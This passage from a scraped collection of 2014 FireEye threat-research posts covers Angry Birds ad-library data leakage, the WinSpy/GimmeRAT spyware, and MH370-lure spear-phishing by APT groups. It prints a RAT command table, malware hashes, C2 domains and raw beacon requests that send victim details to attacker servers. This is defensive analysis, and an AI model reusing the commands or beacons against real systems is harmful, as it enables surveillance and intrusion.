Content-Length: 0 Connection: keep-alive POST /Services/PubAd.svc/GetSingleAdPlacement HTTP/1.1 Content-type: text/json; charset=utf-8 User-Agent: Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; Ascend Y300 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Content-Length: 1690 Host: neptune.appads.com Connection: Keep-Alive {\"data\":{\"Id\":\"8XXX5\",\"acceptLanguage\":\"en\",\"adPool\":0,\"androidId\":\"u1XXX...XXXug\",\"bundleId\": \"com.rovio.angrybirds\",…,\"cookie\":[{\"name\":\"cu 1XXX8 \",\"value\":\"3XXX6+PM\"},{\"name\":\"vw\",\"value\":\"ref=1XXX2&dgi=,eL,default,GFW\"},{\"name\":\"lc\",\"value\":\"1XXX8\"},{\"name\":\"iuXXXg\",\"value\":\"x\"},{\"name\":\"cuXXX8\",\"value\":\"3%2XXXPM\"},{\"name\":\"fXXXg\",\"value\":\"ref=1XXX712&crXXX8=2,1&crXXX8=,1\"}], \"crParms\":\"age=30 ,androidstore='com.android.vending', customer='googleplay', gender='FEMALE' , version='4.1.0'\", \"debugFlags\":0, \"deviceId\":\"aXXX...XXXd\" , \"encDevId\":\"xXXX....XXXs=\", \"encMAC\":\"iXXX...XXXg=\", \"ipAddress\":\"\", \"mac\":\"1XXX...XXX9\" , \"noTrack\":0,\"placement\":\"\", \"pubTargeting\":\" age=30 , androidstore='com.android.vending', customer='googleplay', gender='FEMALE' , version='4.1.0'\",\"rvCR\":\"\", \"type\":\"iq\",\"userAgentInfo\":{\"Build\":\"1.35.0.50370\", \"BuildID\":\"323\", \"Carrier\":\"\",\"Density\":\"High\", \"Device\": \"AscendY300\" , \"DeviceFamily\": \"Huawei\" , \"MCC\":\"0\",\"MNC\":\"0\",... We can see the information transmitted to neptune.appads.com includes gender, age, android id, device id, mac address, device type, etc. In another PCap in which Angry Birds sends POST to the same host name, the IP address is transmitted too: HTTP/1.1 200 OK … POST /Services/v1/SdkConfiguration/Get HTTP/1.1 … Host: neptune.appads.com ... IpAddress\":\"fXXX...XXX9%eth0\" ,... According to whois records , the registrant organization of neptune.appads.com is Burstly, Inc. Therefore, the aforementioned information is actually transmitted to Burstly. It Both PCaps contain the keyword “crParms.” This keyword is also used in the source code to put personal information into a map sent as a payload. Skyrocket.com is an app monetization service provided by Burstly . The following PCap shows that Angry Birds retrieves the customer ID from Skyrocket.com through an HTTP GET request: HTTP/1.1 200 OK Cache-Control: private Content-Type: text/html Date: Thu, 06 Mar 2014 07:12:25 GMT Server: Microsoft-IIS/7.5 ServerName: P-ADS-OR-WEBA #5 X-AspNet-Version: 4.0.30319 X-Powered-By: ASP.NET X-ReqTime: 2 X-Stats: geo-0 Content-Length: 9606 Connection: keep-alive GET /7….4/ad/image/1...c.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; Ascend Y300 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Host: cdn.skyrocketapp.com Connection: Keep-Alive {\"type\":\"ip\",\"Id\":\"9XXX8\",...\"data\":[{\"imageUrl\":\"http://cdn.skyrocketapp.com/79...2c.jpg\",\"adType\":{\"width\":300, \"height\":250, \"extendedProperty\":80}, \"dataType\": 64, \"textAdType\":0,\"destType\":1,\"destParms\":\"\",\"cookie\":[{\"name\":\"fXXXg\", \"value\": \"ref=1XXX2&cr 1XXX8 =2,1&cr1XXX8=1&aoXXX8=\", \"path\":\"/\", \"domain\": \"neptune.appads.com\", \"expires\":\"Sat, 05 Apr 2014 XXX GMT\", \"maxage\": 2…0}, {\"name\":\"vw\",\"value\":\"ref=1XXX2&...},...,\"cbi\":\"http://bs.serving-sys.com/Burstin...25&rtu=-1\",\"cbia\":[\"http://bs….\":1,\"expires\":60},...\"color\":{\"bg\":\"0…0\"}, \"isInterstitial\":1} 2. In this PCap, the ad is fetched by including the customer id 1XXX8 into the HTTP POST request to jumptap.com, i.e. Millennial Media: HTTP/1.1 200 OK Cache-Control: private Content-Type: text/html Date: Thu, XX Mar 2014 XX:XX:XX GMT Server: Microsoft-IIS/7.5 ServerName: P-ADS-OR-WEBC #17 X-AspNet-Version: 4.0.30319 X-Powered-By: ASP.NET X-ReqTime: 475 X-Stats: geo-0;rcf88626-255;rcf75152-218 Content-Length: 2537 Connection: keep-alive GET /img/1547/1XXX2.jpg HTTP/1.1 Host: i.jumptap.com Connection: keep-alive Referer: http://bar/ X-Requested-With: com.rovio.angrybirds User-Agent: Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; Ascend Y300 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Accept-Encoding: gzip,deflate Accept-Language: en-US Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7 {\"type\":\"ip\",\"Id\":\"8XXX5\",\"width\":320,\"height\":50,\"cookie\":[],\"data\":[{\"data\":\"<!-- AdPlacement : banner_ingame_burstly…\",\"adType\":{\"width\":320, \"height\":50, \"extendedProperty\":2064 },\"dataType\":1, \"textAdType\":0, \"destType\":10, \"destParms\":\"\", \"cookie\":[{\"name\":\"...\", \"value\":\"ref=...&cr 1XXX8 =4,1&cr1XXX8=2,1\", \"path\":\"/\", \"domain\":\"neptune.appads.com\", \"expires\":\"Sat, 0X Apr 2014 0X:XX:XX GMT\", \"maxage\":2XXX0}, {\"name\":\"vw\",..., \"crid\":7XXX2, \"aoid\":3XXX3, \"iTrkData\":\"...\", \"clkData\":\"...\",\"feedName\":\"Nexage\"}]} In this pcap, the advertisement is retrieved from jumptap.com. We can use the same customer id “1XXXX8” to easily track the PCap of different ad libraries. 3. For example, in another PCap from turn.com, customer id remains the same: HTTP/1.1 200 OK Cache-Control: private Content-Type: text/html Date: Thu, 06 Mar 2014 07:30:54 GMT Server: Microsoft-IIS/7.5 ServerName: P-ADS-OR-WEBB #6 X-AspNet-Version: 4.0.30319 X-Powered-By: ASP.NET X-ReqTime: 273 X-Stats: geo-0;rcf88626-272 Content-Length: 4714 Connection: keep-alive GET /server/ads.js?pub=24… PvctPFq&acp=0.51 HTTP/1.1 Host: ad.turn.com Connection: keep-alive Referer: http://bar/ Accept: */* X-Requested-With: com.rovio.angrybirds User-Agent: Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; Ascend Y300 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Accept-Encoding: gzip,deflate Accept-Language: en-US Accept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7 {\"type\":\"ip\",\"Id\":\"0...b\",\"width\":320,\"height\":50,\"cookie\":[],\"data\":[{\"data\":\"<!-- AdPlacement : banner_ingame_burstly --> \\\"http://burstly.ads.nexage.com:80...\" destParms\":\"\", \"cookie\":[{\"name\":\"f...g\", \"value\":\"ref=1...0&cr 1XXXX8 =k,1&cr...8=i, 1\",\"path\":\"/\", \"domain\":\"neptune.appads.com\", \"expires\":\"Sat, 0X Apr 2014 0X:XX:XX How is the personal information shared? We also researched the source code of the Burstly (ad mediation platform) to trace the method calls for the information sharing. First in com/burstly/lib/conveniencelayer/BurstlyAnimated Banner.java, when Angry Birds tries to initialize the connection with Burstly, initNewAnimatedBanner() is called as follows: this.initNewAnimatedBanner (arg7.getActivity(), arg8, arg9, arg10, arg11); Inside initNewAnimatedBanner(), it instantiates the BurstlyView object by calling: BurstlyView v0 = new BurstlyView(((Context)arg3)); v0.setZoneId(arg6); Before the ZoneId is set, the initializeView() method is called in the constructor of BurstlyView. Furthermore, inside the initializeView() method, we found the following: new BurstlyViewConfigurator(this).configure(this.mAttributes); Finally in the BurstlyViewConfigurator.configure() method, it sets a series of parameters: this.extractAndApplyBurstlyViewId(); this.extractAndApplyCrParams(); this.extractAndApplyDefaultSessionLife(); this.extractAndApplyPublisherId(); this.extractAndApplyPubTargetingParams(); this.extractAndApplyUseCachedResponse(); this.extractAndApplyZoneId(); These method calls are to retrieve information from burstly.com. For example, in the extractAndApplyCrParams() method, it retrieves parameters from burstly.com and stores them in the BurstlyView object: String v0 = this.mAttributes.getAttributeValue(\"http://burstly.com/lib/ui/schema\", \"crParams\"); if(v0 != null) { BurstlyViewConfigurator.LOG.logDebug(\"BurstlyViewConfigurator\", \"Setting CR params to: {0}\", new Object[]{v0}); this.mBurstlyView.setCrParms(v0); } The key crParms is the same one used in the first PCap to label the values corresponding to personal information such as age and gender. Conclusion In summary, Angry Birds collects user’s personal information and associates with customer id before storing it in the smart phone storage. Then the Burstly ad library embedded in Angry Birds fetches the customer id, uploads the corresponding personal information to the Burstly cloud, and transmits it to other advertising clouds. We have caught such traffics in the network packet captures and the corresponding code paths in the reversed engineered source code. For FireEye ThreatScore information on Angry Birds and more details about the application’s behavior, FireEye Mobile Threat Prevention customers can access their Mobile Threat Prevention (MTP) portal. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/03/from-windows-to-droids-an-insight-in-to-multi-vector-attack-mechanisms-in-rats.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2014-03-18",
                    "source": "www.fireeye.com"
                },
                "text": "FireEye recently observed a targeted attack on a U.S.-based financial institution via a spear-phishing email. The payload used in this campaign is a tool called WinSpy, which is sold by the author as a spying and monitoring tool. The features in this tool resemble that of many other off-the-shelf RATs (Remote Administration Tools) available today. We also observed a second campaign by a different attacker where the WinSpy payload was implanted in macro documents to attack various other targets in what appears to be a spam campaign. The command-and-control (CnC) infrastructure used in the attack against the financial institution is owned and controlled by author of WinSpy. This does not necessarily mean the author is behind attack as the author provides the use of his server for command and control as well as to store the victim data as the default option in the WinSpy package. This feature allowing shared command-and-control infrastructure advertently or inadvertently provides another level of anonymity and deniability for the attacker. While analyzing the windows payloads for WinSpy we discovered that it also had Android spying components, which we have dubbed GimmeRat. The Android tool has multiple components allowing the victim’s device to be controlled by another mobile device remotely over SMS messages or alternatively through a Windows-based controller. The Windows-based controller is simplistic and requires physical access to the device. The recent surge in Android-based RATs such as Dendroid and AndroRAT shows a spike in the interest of malicious actors to control mobile devices. GimmeRAT is another startling example of malicious actors venturing into the Android ecosystem. Attacks Employing WinSpy While the WinSpy tool is being sold as a spying and monitoring tool for home users, its remote administration capabilities fits the bill for an adversary looking to infiltrate a target or organization. This tool also adds another layer of anonymity for the attacker by using the default command-and-control server provided as part of the WinSpy package. Figure 1 - Mechanism of attack on financial institution employing WinSpy The attack targeting a U.S. financial institution arrives via a spear-phishing email. The attachment (b430263181959f4dd681e9d5fd15d2a0) in the email is a large NSIS packed file, which when detonated launches a screenshot of a pay slip as decoy to avert the attention of the victim. It also drops and launches various components as seen in Figure 1 and Figure 2. Figure 2 - Components of WinSpy We observed a second attacker using WinSpy in macro documents (78fc7bccd86c645cc66b1a719b6e1258, f496bf5c7bc6843b395cc309da004345) as well as standalone executables (8859bbe7f22729d5b4a7d821cfabb044, 2b19ca87739361fa4d7ee318e6248d05). These arrive either as an attachment or as a link to the payload in emails. The documents had the unique metadata shown below: File Type                       : XLS MIME Type                    : application/vnd.ms-excel Author                          : MR. FRANK Last Modified By              : MR. FRANK Software                        : Microsoft Excel Create Date                    : 2012:02:07 10:41:21 Modify Date                     : 2012:02:07 10:41:29 Security                          : None Code Page                       : Windows Latin 1 (Western European) Company                         : USER App Version                     : 11.5606 The email attacks were found to have attachment names such as Western Union Slip.xls Money Transfer Wumt.xls Wumt.xls Windows Components The WinSpy modules are written in Visual Basic and use some freely available libraries such as modJPEG.bas and cJpeg.cls . The components each support various features as shown below. Feature Component Webcam monitoring Webcam monitoring RDS.exe RDS.exe Screen capture & JPEG Encoder Screen capture & JPEG Encoder RDS.exe RDS.exe Connectivity check Connectivity check RDS.exe RDS.exe Send Victim information to CnC Send Victim information to CnC RDS.exe RDS.exe FTP exfiltration FTP exfiltration RDS.exe RDS.exe Status Report to CnC Status Report to CnC windns.exe windns.exe Email/FTP exfiltration Email/FTP exfiltration windns.exe windns.exe AV Find and Kill AV Find and Kill windns.exe windns.exe Auto configure firewall Auto configure firewall windns.exe windns.exe Keylogging and reports Keylogging and reports messenger.exe messenger.exe Backdoor for remote interaction Backdoor for remote interaction rdbms.exe rdbms.exe Microphone recording Microphone recording rdbms.exe rdbms.exe Upload/download/execute files Upload/download/execute files rdbms.exe rdbms.exe File system browser File system browser rdbms.exe rdbms.exe Execute remote commands Execute remote commands rdbms.exe rdbms.exe Send messages to remote machine Send messages to remote machine rdbms.exe rdbms.exe The WinSpy malware creates its configuration in the registry under \"SOFTWARE\\MSI64\" as shown in Figure 2. The various components of WinSpy read this configuration at runtime. This configuration dictates various settings such as the username, unique identifier, connection parameters, remote FTP server and credentials, filename and path for captured data, current status, etc. The various options in the configuration are abbreviations. For example \"DUNIN\" stands for date to uninstall, \"FTSV\" stands for FTP server, \"FTUS\" stands for FTP user, and so forth. The \"SID2\" value is a unique ID used to identify the infection and is generated at build time. Figure 3 - WinSpy Configuration The WinSpy controller has options to create a new remote file allowing you to choose various parameters and exfiltration options. The author interestingly allows for default command and control and exfiltration options to a server he controls. Figure 4 - WinSpy Builder The controller has options to retrieve screenshots, keylogs, and various reports from the victim’s machine. It also has the ability to interact with file system to upload and download files as well as execute new payloads. Figure 5 - WinSpy Controller Figure 6 - WinSpy File Browser Command and Control The WinSpy payloads have multiple communication methods for reporting status, attacker interaction, and data exfiltration each of which are described below. Method 1 - I am online : It reports back to the authors server on port 14001 to report the victim's online status with \"/P\" and it receives the same command in response to acknowledge. Figure 7 - Online Status Method 2 - Victim Information: It also reports back to the WinSpy author’s server on port 27171 using a secondary protocol shown below. The request contains the victim’s IP address as well as unique identifier generated at build time of the payload. The server responds with a keep alive in response to this request. Figure 8 - Victim Information Figure 9 - Victim information Method 3 - SMTP Exfiltration: It relays keylog data through SMTP if configured. It relays emails through an SMTP server running on port 37 on the WinSpy author’s server using preconfigured authentication parameters. Port 37 is typically used by NTP protocol but in this case the author has reconfigured it for SMTP relay. The X-Mailer \"SysMon v1.0.0\" sticks out like a sore thumb. Figure 10 - SMTP Exfiltration Method 4 - FTP Exfiltration: If configured with a custom FTP server, the WinSpy payload will upload all intercepted data and report to the remote server periodically. The FTP credentials are stored in the registry configuration discussed earlier. Method 5 - Direct Interaction: The rdbms.exe module listens on port 443 on the victim’s machine. The attacker can directly connect to this port from the WinSpy controller and issue various commands to download captured data, upload/download files, execute files, send messages, view webcam feeds, etc. Any required data transfer is done over Port 444. It supports various commands, the significant ones are shown below. The initial connection commands shows that the author plans to implement authentication at some point in time but as it stands now anyone can connect to an infected instance using this command. Command Description /CLUserName.Password. /CLUserName.Password. Initialize connection from controller Initialize connection from controller /CK /CK Acknowledge Acknowledge /CB{OptionalPath} /CB{OptionalPath} Enumerates all files in root dir or specified path Enumerates all files in root dir or specified path /CU{FilePath} /CU{FilePath} Uploads specified File Uploads specified File /CD{FilePath} /CD{FilePath} Downloads file from specified path Downloads file from specified path /CD \\\\\\KEYLOGS /CD \\\\\\KEYLOGS Download keylogs Download keylogs /CD \\\\\\WEBSITED /CD \\\\\\WEBSITED Download websites visited detail report Download websites visited detail report /CD \\\\\\WEBSITES /CD \\\\\\WEBSITES Download websites visited summary report Download websites visited summary report /CD \\\\\\ONLINETIME /CD \\\\\\ONLINETIME Download online time report Download online time report /CD \\\\\\CHATROOM /CD \\\\\\CHATROOM Download chat logs Download chat logs /CD \\\\\\PCACTIVETIME /CD \\\\\\PCACTIVETIME Download PC active time report Download PC active time report /RF{FilePath} /RF{FilePath} Execute remote file in specified path Execute remote file in specified path /WO & /WE /WO & /WE Webcam init and enable Webcam init and enable /SO /SO Start microphone recording Start microphone recording /AR{Command} /AR{Command} Run command on remote machine Run command on remote machine /AM{Message} /AM{Message} Sends message to remote machine Sends message to remote machine Android Components In the process of investigating the Windows modules for WinSpy we also discovered various Android components that can be employed to engage in surveillance of a target. We have found three different applications that are a part of the surveillance package. One of the applications requires commandeering via a windows controller and requires physical access to the device while the other two applications can be deployed in a client-server model and allow remote access through a second Android device. Figure 11 - Deployment Scenarios for Android Components Windows Physical Controller: The Windows controller requires physical access to the device and allows the attacker to retrieve screenshots from the infected device. This component is designed to target a victim in physical proximity. The various options available in the Windows controller are shown in Figure 12 below. Figure 12 - Windows Controller for Android Device The functionality and structure of the components on the victim’s device are described below in detail. Component 1 -  GlobalService.apk Components: a. Services Global Service b. Methods Sleeper ScreenCapturer ServiceActivity Main activity The app is started with an intent that is provided from the desktop android executable. The intent is a \"com.google.system.service.StartUpReceiver\" intent with the extra field of \"interval\" which holds a string of the form “interval@@hostname@@port@@username@@password@@working_directory@@delete_after_upload” The hostname, port, username, and password are used to connect to the attackers' FTP server to send screenshots, which is explained, in a later section. Once this intent is received the GlobalService is restarted with the interval parameter.. GlobalService This service contains the following variables private static final String TAG = \"GlobalService\"; private static boolean isScreenON; private int mInterval; private KeyguardManager mKeyGaurdManager; private BroadcastReceiver mPowerKeyReceiver; private Timer mSyncTimer; private TimerTask mSyncTimerTask; It goes on to check the value of the isScreenON variable. If the screen is on and if the keyguard has been unlocked, it calls the startScreenCaptureThread() method. The startScreenCaptureThread method sets the value of the mInterval variable to the value of interval passed to GlobalService. It also sets the properties of the mSyncTimerTask to point to the takeScreenshot method from the ScreenCapturer class such that the thread, when invoked, will take a screenshot every ‘interval’ number of seconds. The takeScreenshot method in the ScreenCapturer class connects to a native service using a local socket. It connects to port 42345 on localhost. The native service, which is listening on the same port, accepts strings on the socket. The takeScreenshot method sends a string of the form ‘/data/local/tmp/images/screenshot_DATE.png’ to the underlying native service. The native service checks for the string after the last trailing slash “/”, “screenshot” after the last trailing slash will cause the native service to take a screenshot by issuing the “screencap –p” method. The screenshot taken will be written to the path specified by the string passed as an argument. The takeScreenshot method then returns the path of the image to the screenCaptureThread which calls the FTPService thereby uploading the screenshot to the attackers CnC server. Component 2 - GlobalNativeService The native services listens on a local socket for commands from the GlobalService.apk. As seen above, if the string after the last trailing slash is “screenshot_” is sent to the Native service through the socket. It runs the command “screencap –p” on the shell of the device and captures a screenshot of the infected device. The native service also implements other functionality such as deleting a file, saving FTP information to /data/local/tmp/ftpInformation. If the string “GPSLocationInfo” is sent to the native service on the local socket, it creates GPSLocations.txt at /data/local/tmp/GPSLocations.txt but does not save the current GPS location. This perhaps indicates an upcoming feature. Android Remote Controller Component 1 - GPSTracker.apk The startup routine for the GPSTracker class is exactly the same as the one for GlobalService class. It gets the value from an \"StartGPSTracker\" intent which holds the value for an 'interval' variable as an integer. This app records the GPS location of the device at regular intervals (5 minutes). It records the location only if the previous location is 200 meters apart from the current location. When a location has to be added to the database all previous locations are deleted. Therefore it only maintains the last known location. This app monitors all incoming messages. If an SMS with \"[gmyl]\"(Short for (g)ive (m)e (y)our (l)ocation) at the beginning arrives on the device, the corresponding SMS_RECEIVED intent is aborted and the database is queried. A response SMS is crafted as shown below: \"[himl]<>DATE><LATITUDE##LONGTITUDE\" The string “himl” is short for (h)ere (i)s (m)y (l)ocation. Only the last known location is sent as a response to the user. Component 2 - GPSTrackerClient.apk This app acts as the controller to the GPSTracker.apk. While the GPSTracker.apk is installed on the victim's device, the GPSTrackerClient.apk is installed on the device from which the monitoring takes place. It takes the phone number of the phone to be tracked and sends it an SMS that contains \"[gmyl]\". The GPSTracker.apk then responds with the location in an SMS message as described in the above section. It then uses the native maps functionality, i.e., Google Maps, to point to the location sent by GPSTracker. It is also worthwhile to note that the two modules do not authenticate each other by any means therefore it allows anyone infected with GPSTracker.apk to be controlled just by sending SMS messages with a given structure. Conclusion These attacks and tools reaffirm that we live in an age of digital surveillance and intellectual property theft. Off-the-shelf RATs have continued to proliferate over the years and attackers have continued to increasingly use these tools. With the widespread adoption of mobile platforms such as Android, a new market continues to emerge with the demand for RATs to support these platforms. We will continue to see more implementations of RATs and payloads to support multiple platforms and attackers will continue to take advantage of these new attack surfaces to infiltrate their targets. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/03/spear-phishing-the-news-cycle-apt-actors-leverage-interest-in-the-disappearance-of-malaysian-flight-mh-370.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2014-03-25",
                    "source": "www.fireeye.com"
                },
                "text": "While many advanced persistent threat (APT) groups have increasingly embraced strategic Web compromise as a malware delivery vector, groups also continue to rely on spear-phishing emails that leverage popular news stories. The recent tragic disappearance of flight MH 370 is no exception. This post will examine multiple instances from different threat groups, all using spear-phishing messages and leveraging the disappearance of Flight 370 as a lure to convince the target to open a malicious attachment. “Admin@338” Targets an APAC Government and U.S. Think Tank The first spear phish from group “Admin@338” was sent to a foreign government in the Asian Pacific region on March 10, 2014 – just two days after the flight disappeared. The threat actors sent a spear-phishing email with an attachment titled, “Malaysian Airlines MH370.doc” (MD5: 9c43a26fe4538a373b7f5921055ddeae). Although threat actors often include some sort of “decoy content” upon successful exploitation (that is, a document representing what the recipient expected to open), in this case, the user is simply shown a blank document. The attachment dropped a Poison Ivy variant into the path C:\\DOCUME~1\\admin\\LOCALS~1\\Temp\\kav.exe (MD5: 9dbe491b7d614251e75fb19e8b1b0d0d), which, in turn, beaconed outbound to www.verizon.proxydns[.]com. This Poison Ivy variant was configured with the connection password “wwwst@Admin.” The APT group we refer to as Admin@338 has previously used Poison Ivy implants with this same password. We document the Admin@338 group’s activities in our Poison Ivy: Assessing Damage and Extracting Intelligence paper. Further, the domain www.verizon.proxydns[.]com previously resolved to the following IP addresses that have also been used by the Admin@338 group: IP Address First Seen Last Seen 103.31.241.110 103.31.241.110 2013-08-27 2013-08-27 2013-08-28 2013-08-28 174.139.242.19 174.139.242.19 2013-08-28 2013-08-28 2013-08-31 2013-08-31 58.64.153.157 58.64.153.157 2013-09-03 2013-09-03 2014-03-07 2014-03-07 59.188.0.197 59.188.0.197 2014-03-07 2014-03-07 2014-03-19 2014-03-19 A second targeted attack attributed to the same Admin@338 group was sent to a prominent U.S.-based think tank on March 14, 2014. This spear phish contained an attachment that dropped “Malaysian Airlines MH370 5m Video.exe” (MD5: b869dc959daac3458b6a81bc006e5b97). The malware sample was crafted to appear as though it was a Flash video, by binding a Flash icon to the malicious executable. Interestingly, in this case, the malware sets its persistence in the normal “Run” registry location, but it tries to auto start the payload from the disk directory “c:\\programdata”, which doesn’t exist until Windows 7, so a simple reboot would mitigate this threat on Windows XP. This suggests the threat actors did not perform quality control on the malware or were simply careless. We detect this implant as Backdoor.APT.WinHTTPHelper . The Admin@338 group discussed above has used variants of this same malware family in previous targeted attacks . This specific implant beacons out to dpmc.dynssl[.]com:443 and www.dpmc.dynssl[.]com:80. The domain dpmc.dynssl[.]com resolved to the following IPs: IP Address First Seen Last Seen 31.193.133.101 31.193.133.101 2013-11-01 2013-11-01 2013-11-29 2013-11-29 58.64.153.157 58.64.153.157 2014-01-10 2014-01-10 2014-03-08 2014-03-08 59.188.0.197 59.188.0.197 2014-03-14 2014-03-14 2014-03-17 2014-03-17 139.191.142.168 139.191.142.168 2014-03-17 2014-03-17 2014-03-19 2014-03-19 The www.dpmc.dynssl[.]com domain resolved to following IPs: IP Address First Seen Last Seen 31.193.133.101 31.193.133.101 2013-10-30 2013-10-30 2013-11-29 2013-11-29 58.64.153.157 58.64.153.157 2014-01-10 2014-01-10 2014-03-08 2014-03-08 59.188.0.197 59.188.0.197 2014-03-14 2014-03-14 2014-03-18 2014-03-18 139.191.142.168 139.191.142.168 2014-03-17 2014-03-17 2014-03-19 2014-03-19 Note that the www.verizon.proxydns[.]com domain used by the Poison Ivy discussed above also resolved to both 58.64.153.157 and 59.188.0.197 during the same time frame as the Backdoor.APT.WinHTTPHelper command and control (CnC) located at dpmc.dynssl[.]com and www.dpmc.dynssl[.]com. In addition to the above activity attributed to the Admin@338 group, a number of other malicious documents abusing the missing Flight 370 story were also seen in the wild. Other threat groups likely sent these other documents. The Naikon Lures On March 9, 2014, a malicious executable entitled the “Search for MH370 continues as report says FBI agents on way to offer assistance.pdf .exe“ (MD5: 52408bffd295b3e69e983be9bdcdd6aa) was seen circulating in the wild. This sample beacons to the CnC net.googlereader[.]pw:443. We have identified this sample, via forensic analysis, as Backdoor.APT.Naikon. It uses a standard technique of changing its icon to make it appear to be a PDF, in order to lend to its credibility. This same icon, embedded as a PE Resource, has been used in the following recent samples: MD5 Import hash CnC Server fcc59add998760b76f009b1fdfacf840 fcc59add998760b76f009b1fdfacf840 e30e07abf1633e10c2d1fbf34e9333d6 e30e07abf1633e10c2d1fbf34e9333d6 ecoh.oicp[.]net ecoh.oicp[.]net 018f762da9b51d7557062548d2b91eeb 018f762da9b51d7557062548d2b91eeb e30e07abf1633e10c2d1fbf34e9333d6 e30e07abf1633e10c2d1fbf34e9333d6 orayjue.eicp[.]net orayjue.eicp[.]net fcc59add998760b76f009b1fdfacf840 fcc59add998760b76f009b1fdfacf840 e30e07abf1633e10c2d1fbf34e9333d6 e30e07abf1633e10c2d1fbf34e9333d6 ecoh.oicp[.]net:443 ecoh.oicp[.]net:443 498aaf6df71211f9fcb8f182a71fc1f0 498aaf6df71211f9fcb8f182a71fc1f0 a692dca39e952b61501a278ebafab97f a692dca39e952b61501a278ebafab97f xl.findmy[.]pw xl.findmy[.]pw a093440e75ff4fef256f5a9c1106069a a093440e75ff4fef256f5a9c1106069a a692dca39e952b61501a278ebafab97f a692dca39e952b61501a278ebafab97f xl.findmy[.]pw xl.findmy[.]pw 125dbbb742399ec2c39957920867ee60 125dbbb742399ec2c39957920867ee60 a692dca39e952b61501a278ebafab97f a692dca39e952b61501a278ebafab97f uu.yahoomail[.]pw uu.yahoomail[.]pw 52408bffd295b3e69e983be9bdcdd6aa 52408bffd295b3e69e983be9bdcdd6aa a692dca39e952b61501a278ebafab97f a692dca39e952b61501a278ebafab97f net.googlereader[.]pw net.googlereader[.]pw This malware leverages “pdfbind” to add a PDF into itself, as can be seen in the debugging strings, and when launched, the malware also presents a decoy document to the target: The Plat1 Lures On March 10, 2014, we observed another sample that exploited CVE-2012-0158, titled “MH370班机可以人员身份信息.doc” (MD5: 4ff2156c74e0a36d16fa4aea29f38ff8), which roughly translates to “MH370 Flight Personnel Identity Information”. The malware that is dropped by the malicious Word document, which we detect as Trojan.APT.Plat1, begins to beacon to 59.188.253.216 via TCP over port 80. The decoy document opened after exploitation is blank. The malicious document dropped the following implants: C:\\Documents and Settings\\Administrator\\Application Data\\Intel\\ResN32.dll (MD5: 2437f6c333cf61db53b596d192cafe64) C:\\Documents and Settings\\Administrator\\Application Data\\Intel\\~y.dll (MD5: d8540b23e52892c6009fdd5812e9c597) The implants dropped by this malicious document both included unique PDB paths that can be used to find related samples. These paths were as follows: E:\\Work\\T5000\\T5 Install\\ResN\\Release\\ResN32.pdb F:\\WORK\\PROJECT\\T5 Install\\InstDll\\Release\\InstDll.pdb This malware family was also described in more detail here . The Mongall/Saker Lures Another sample leveraging the missing airliner theme was seen on March 12, 2014. The malicious document exploited CVE-2012-0158 and was titled, “Missing Malaysia Airlines Flight 370.doc” (MD5: 467478fa0670fa8576b21d860c1523c6). Although the extension looked like a Microsoft Office .DOC file, it was actually an .HTML Application (HTA) file. Once the exploit is successful, the payload makes itself persistent by adding a Windows shortcut (.LNK) file pointing to the malware in the “Startup” folder in the start menu. It beacons outbound to comer4s.minidns[.]net:8070. The network callback pattern, shown below, is known by researchers as “Mongall” or “Saker”: GET /3010FC080[REDACTED] HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Wis NT 5.0; .NET CLR 1.1.4322) Host: comer4s.minidns.net:8070 Cache-Control: no-cache The sample also drops a decoy file called “aa.doc” into the temp folder and displays the decoy content shown below: The “Tranchulas” Lures On March 18, 2014 a sample entitled “Malysia Airline MH370 hijacked by Pakistan.zip” was sent as a ZIP file (MD5: 7dff5c4ae1b1fea7ecbf7ab787da3468) that contained a Windows screensaver file disguised as a PDF (MD5: b03edbb264aa0c980ab2974652688876). The ZIP file was hosted on 199.91.173.43. This IP address was previously used to host malicious files. The screen saver file drops “winservice.exe” (MD5: 828d4a66487d25b413cb19ef8ee7c783) which begins beaconing to 199.91.173.45. This IP address was previously used to host a file entitled “obl_leaked_report.zip” (MD5: a4c7c79308139a7ee70aacf68bba814f). The initial beacon to the command-and-control server is as follows: POST /path_active.php?compname=[HOSTNAME]_[USERNAME] HTTP/1.1 Host: 199.91.173.45 Accept: */* Content-Length: 11 Content-Type: application/x-www-form-urlencoded This same control server was used in previous activity . The Page Campaign A final malicious document was seen abusing the missing Flight 370 story on March 18, 2014. This document exploited CVE-2012-0158 and was entitled “MH370 PM statement 15.03.14 - FINAL.DOC” (MD5: 5e8d64185737f835318489fda46f31a6). This document dropped a Backdoor.APT.Page implant and connected to 122.10.89.85 on both port 80 and 443. The initial beacon traffic over port 80 is as follows: GET /18110143/page_32180701.html HTTP/1.1 Accept: */* Cookie: XX=0; BX=0 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32) Host: 122.10.89.85 Connection: Keep-Alive Cache-Control: no-cache Pragma: no-cache Conclusion While many APT actors have adopted strategic Web compromise as a delivery vector, it is apparent that spear phishing via email-based attachments or links to zip files remain popular with many threat actors, especially when paired with lures discussing current media events. Network defenders should incorporate these facts into their user training programs and be on heightened alert for regular spear-phishing campaigns, which leverage topics dominating the news cycle. Acknowledgement: We thank Nart Villeneuve and Patrick Olsen for their support, research, and analysis on these findings. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/03/android-misosms-its-back-now-with-xtea.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2014-03-31",
